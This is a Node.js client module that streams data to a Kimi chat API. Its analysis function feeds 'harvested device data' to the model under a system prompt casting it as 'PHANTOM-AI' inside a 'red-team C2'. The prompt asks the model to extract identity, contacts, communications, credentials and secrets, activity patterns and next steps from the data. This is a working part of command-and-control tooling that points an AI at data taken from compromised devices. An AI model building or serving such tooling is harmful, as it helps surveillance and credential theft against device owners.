const fs = require('fs');
const path = require('path');
const https = require('https');

function loadEnv() {
    const envPath = path.join(__dirname, '.env');
    if (!fs.existsSync(envPath)) return {};
    const env = {};
    fs.readFileSync(envPath, 'utf8').split('\n').forEach(line => {
        const t = line.trim();
        if (!t || t.startsWith('#')) return;
        const eq = t.indexOf('=');
        if (eq === -1) return;
        env[t.substring(0, eq).trim()] = t.substring(eq + 1).trim();
    });
    return env;
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

class GroqClient {
    constructor() {
        const env = loadEnv();
        this.apiKey = env.KIMI_API_KEY || '';
        this.baseUrl = 'https://api.moonshot.ai/v1/chat/completions';
        this.model = 'kimi-k2.6';
        this.lastCallAt = 0;
        this.minGapMs = 22000; // ~2.7 req/min
    }

    async _throttle() {
        const now = Date.now();
        const elapsed = now - this.lastCallAt;
        if (elapsed < this.minGapMs && this.lastCallAt > 0) await sleep(this.minGapMs - elapsed);
        this.lastCallAt = Date.now();
    }

    _requestStream(body, timeoutMs, onToken) {
        return new Promise((resolve, reject) => {
            const data = JSON.stringify(body);
            const url = new URL(this.baseUrl);
            const options = {
                method: 'POST',
                hostname: url.hostname,
                port: 443,
                path: url.pathname,
                headers: {
                    'Authorization': 'Bearer ' + this.apiKey,
                    'Content-Type': 'application/json',
                    'Content-Length': Buffer.byteLength(data),
                    'Accept': 'text/event-stream'
                },
                timeout: timeoutMs || 300000
            };

            const req = https.request(options, (res) => {
                if (res.statusCode !== 200) {
                    let buf = '';
                    res.on('data', c => buf += c);
                    res.on('end', () => {
                        let parsed = null;
                        try { parsed = JSON.parse(buf); } catch (e) { }
                        const err = new Error('HTTP ' + res.statusCode);
                        err.statusCode = res.statusCode;
                        err.body = parsed || buf;
                        reject(err);
                    });
                    return;
                }

                let buffer = '';
                let fullContent = '';

                res.on('data', (chunk) => {
                    buffer += chunk.toString('utf8');
                    let idx;
                    while ((idx = buffer.indexOf('\n')) !== -1) {
                        let line = buffer.slice(0, idx).trim();
                        buffer = buffer.slice(idx + 1);
                        if (!line || !line.startsWith('data:')) continue;
                        const payload = line.substring(5).trim();
                        if (payload === '[DONE]') continue;
                        try {
                            const json = JSON.parse(payload);
                            const choices = json.choices || [];
                            if (choices.length === 0) continue;
                            const delta = choices[0].delta || {};
                            const content = delta.content;
                            if (typeof content === 'string' && content.length > 0) {
                                fullContent += content;
                                try { onToken(content, fullContent); } catch (e) { }
                            }
                        } catch (e) { }
                    }
                });

                res.on('end', () => resolve({ ok: true, content: fullContent }));
                res.on('error', (err) => reject(err));
            });

            req.on('error', reject);
            req.on('timeout', () => { req.destroy(); reject(new Error('Kimi stream timeout')); });
            req.write(data);
            req.end();
        });
    }

    async runAnalysis(scope, payload, onToken) {
        if (!this.apiKey) throw new Error('KIMI_API_KEY missing from .env');
        await this._throttle();

        const scopeLine = scope === 'all'
            ? 'ALL harvested data for this device'
            : 'scopes: ' + [].concat(scope).join(', ');

        let payloadStr = JSON.stringify(payload, null, 2);
        if (payloadStr.length > 120000) payloadStr = payloadStr.substring(0, 120000) + '\n... (truncated)';

        const system =
            'You are PHANTOM-AI, a forensic data analyst embedded in a red-team C2.\n' +
            'You receive harvested device data and produce a structured Markdown report.\n' +
            'Output rules:\n' +
            '- Start with a one-line "TL;DR".\n' +
            '- Then sections: Identity, Contacts & Comms, Credentials & Secrets, Activity Patterns, Risk Flags, Next Steps.\n' +
            '- Be concrete. Cite specific phone numbers, package names, filenames, times.\n' +
            '- If a scope is empty, say so — do not invent data.\n' +
            '- No preamble. No markdown fences. Raw Markdown only.';

        const user =
            'Scope: ' + scopeLine + '\n\n' +
            'Data:\n' + payloadStr;

        return await this._requestStream({
            model: this.model,
            messages: [
                { role: 'system', content: system },
                { role: 'user', content: user }
            ],
            temperature: 1,
            max_tokens: 8192,
            stream: true
        }, 300000, onToken);
    }
}

module.exports = GroqClient;